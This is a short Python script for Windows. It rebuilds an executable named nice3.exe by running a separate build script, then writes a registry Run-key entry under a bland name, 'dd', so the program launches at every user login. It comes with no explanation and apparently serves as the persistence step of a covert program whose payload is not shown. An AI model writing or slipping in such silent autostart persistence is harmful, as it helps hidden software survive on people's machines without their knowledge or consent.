import os,shutil,winreg


filedir=os.getcwd()
filename="nice3.exe"
filepath=os.path.join(filedir,filename)



if os.path.isfile(filepath):
    os.remove(filepath)
    
print(filedir)
# os.chdir(r"C:\Users\Aman\Music\sns\hi")

# os.chdir("C:\\Users\\Aman\\Music\\sns\\hi")

filedir=os.getcwd()
print(filedir)

os.system("python buildexe.py")



# shutil.move(filename,filedir)


reghive= winreg.HKEY_CURRENT_USER
regpath="SOFTWARE\Microsoft\Windows\CurrentVersion\Run"


reg=winreg.ConnectRegistry(None,reghive)
key=winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "dd", 0,winreg.REG_SZ, filepath)
